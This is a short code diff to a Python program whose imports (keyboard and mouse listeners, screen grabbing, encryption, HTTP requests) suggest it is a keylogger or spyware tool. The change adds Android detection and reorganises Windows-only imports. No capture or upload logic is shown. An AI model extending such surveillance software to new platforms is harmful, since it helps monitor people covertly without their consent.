@@ -9,13 +9,19 @@ from cryptography.fernet import Fernet
 from pynput import keyboard, mouse
 from PIL import ImageGrab
 import requests
-import win32file
-import win32con
 import string
+
+# Android-specific imports
+if platform.system() == "Linux" and "ANDROID_STORAGE" in os.environ:
+    is_android = True
+else:
+    is_android = False
 
 # Windows-specific imports
 if platform.system() == "Windows":
     try:
+        import win32file
+        import win32con
         import win32gui
         import win32process
     except ImportError:
@@ -60,6 +66,8 @@ def get_active_window_process_name() -> str:
             _, pid = win32process.GetWindowThreadProcessId(window_handle)
             process = psutil.Process(pid)
             return f"{process.name()} - {window_title}"
+        elif is_android:
+            return "Android App"
         else:
             return psutil.Process(os.getpid()).name()
     except Exception as e:
